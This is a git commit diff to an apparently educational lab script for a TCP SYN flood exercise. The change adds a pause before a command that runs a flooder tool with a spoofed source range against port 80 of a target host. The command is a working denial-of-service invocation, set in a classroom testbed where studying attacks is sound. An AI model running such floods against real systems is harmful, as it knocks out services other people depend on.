043314abd22ed9c39522db2b9d70bf99a14cd0ba
Matteo Franzil <matteofranzil@gmail.com>
2021-10-17 08:42:53 +0200

    part 2 of said ex

--- 05-synflood/scripts/attacker-script.sh
+++ 05-synflood/scripts/attacker-script.sh
@@ -1,6 +1,7 @@
 # On attacker
 /share/education/TCPSYNFlood_USC_ISI/install-flooder
 
+read -p "Press Enter to continue..."
 sudo flooder --dst 5.6.7.8 --src 1.1.2.0 --srcmask 255.255.255.0 --highrate 100 --lowrate 100 --proto 6 --dportmin 80 --dportmax 80
 
 # NO SPOOFER
